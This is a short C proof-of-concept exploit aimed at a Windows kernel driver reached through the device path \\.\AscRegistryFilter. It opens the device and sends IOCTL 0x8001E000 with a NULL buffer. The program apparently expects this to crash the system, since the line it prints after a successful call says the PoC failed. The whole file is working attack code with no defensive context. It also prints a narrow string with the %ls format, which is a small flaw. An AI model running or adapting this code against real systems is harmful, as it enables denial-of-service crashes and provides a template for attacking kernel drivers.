#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

#define DRIVER_PATH "\\\\.\\AscRegistryFilter"
#define IOCTL_CODE 0x8001E000

int main()
{
	DWORD bResult;
	DWORD junk = 0;

	printf(" [*] Getting a handle to the Driver: %ls\n", DRIVER_PATH);

	HANDLE hDevice = CreateFile(DRIVER_PATH,GENERIC_READ | GENERIC_WRITE,FILE_SHARE_WRITE,NULL,
				    OPEN_EXISTING,FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,NULL);

	if (hDevice == INVALID_HANDLE_VALUE){
		
		printf(" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	printf(" [+] Our Device Handle: 0x%p \n", hDevice);
	printf(" [*] Lets send NULL to the Driver\n");

	bResult = DeviceIoControl(hDevice, IOCTL_CODE, NULL, 0, NULL,0, &junk, (LPOVERLAPPED)NULL);
	
	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}
	wprintf(L" [-] Error sending data, PoC failed...");
	CloseHandle(hDevice);
	return 0;
}
